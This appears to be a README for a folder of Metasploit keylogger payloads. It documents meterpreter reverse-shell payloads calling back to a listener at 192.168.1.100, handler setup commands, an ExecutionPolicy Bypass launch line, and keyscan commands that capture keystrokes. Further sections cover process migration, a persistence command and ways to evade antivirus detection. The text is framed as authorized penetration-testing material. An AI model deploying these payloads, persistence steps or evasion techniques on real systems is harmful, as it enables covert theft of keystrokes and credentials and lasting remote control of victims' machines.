# Metasploit Keylogger Test Payloads

This directory contains various test payloads generated using Metasploit Framework for keylogging capabilities testing in authorized penetration testing scenarios.

## ⚠️ LEGAL DISCLAIMER
These payloads are for **AUTHORIZED TESTING ONLY**. Only use these tools in:
- Your own lab environments
- Systems you own or have explicit written permission to test
- Authorized penetration testing engagements
- Educational purposes in controlled environments

Unauthorized use of keyloggers is illegal and unethical.

## Generated Payloads

### 1. Windows x64 TCP Reverse Shell
- **File:** `windows_keylogger_test.exe`
- **Payload:** `windows/x64/meterpreter/reverse_tcp`
- **LHOST:** 192.168.1.100
- **LPORT:** 4444
- **Size:** 7,168 bytes
- **Format:** Windows PE executable

### 2. Python Cross-Platform
- **File:** `python_keylogger_test.py`
- **Payload:** `python/meterpreter/reverse_tcp`
- **LHOST:** 192.168.1.100
- **LPORT:** 4445
- **Size:** 436 bytes
- **Format:** Raw Python script

### 3. Windows HTTPS Reverse Shell
- **File:** `windows_https_keylogger.exe`
- **Payload:** `windows/meterpreter/reverse_https`
- **LHOST:** 192.168.1.100
- **LPORT:** 443
- **Size:** 73,802 bytes
- **Format:** Windows PE executable (x86)

### 4. PowerShell Payload
- **File:** `powershell_keylogger.ps1`
- **Payload:** `windows/x64/meterpreter/reverse_tcp`
- **LHOST:** 127.0.0.1
- **LPORT:** 8080
- **Size:** 2,500 bytes
- **Format:** PowerShell script

## Usage Instructions

### 1. Setup Handlers
Use the provided resource script to set up multiple handlers:
```bash
msfconsole -r handler_setup.rc
```

Or manually set up handlers:
```bash
msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.1.100
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit -j
```

### 2. Execute Payloads
- **Windows EXE:** Run directly on target Windows system
- **Python:** Execute with `python python_keylogger_test.py`
- **PowerShell:** Run with `powershell -ExecutionPolicy Bypass -File powershell_keylogger.ps1`

### 3. Keylogger Commands
Once you have a Meterpreter session:
```
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop
```

See `keylogger_commands.txt` for complete command reference.

## Testing Recommendations

1. **Lab Environment:** Always test in isolated lab environments
2. **Network Isolation:** Use isolated networks to prevent accidental exposure
3. **Antivirus Testing:** Test detection rates with various AV solutions
4. **Process Migration:** Test stealth capabilities with process migration
5. **Persistence:** Evaluate persistence mechanisms in controlled environments

## Files in This Directory

- `windows_keylogger_test.exe` - Windows x64 TCP reverse shell
- `python_keylogger_test.py` - Python cross-platform payload  
- `windows_https_keylogger.exe` - Windows HTTPS reverse shell
- `powershell_keylogger.ps1` - PowerShell-based payload
- `handler_setup.rc` - Metasploit resource script for handlers
- `keylogger_commands.txt` - Keylogger command reference
- `README.md` - This documentation file

## Advanced Usage

### Process Migration
```
meterpreter > ps
meterpreter > migrate <PID>
```

### Post-Exploitation Module
```
meterpreter > run post/windows/capture/keylog_recorder
```

### Persistence
```
meterpreter > run persistence -X -i 5 -p 4444 -r 192.168.1.100
```

## Detection Evasion

1. **Encoding:** Consider using encoders with msfvenom (`-e` option)
2. **Process Hollowing:** Migrate to legitimate processes
3. **Memory Injection:** Use in-memory payloads when possible
4. **Custom Templates:** Use custom executable templates (`-x` option)

## Cleanup

Remember to properly clean up test environments:
1. Remove payload files from target systems
2. Clear any persistence mechanisms installed
3. Reset test systems to clean states
4. Document any changes made during testing

---
**Generated on:** $(date)
**Kali Linux Version:** $(cat /etc/debian_version)
**Metasploit Version:** $(msfconsole -v | head -1)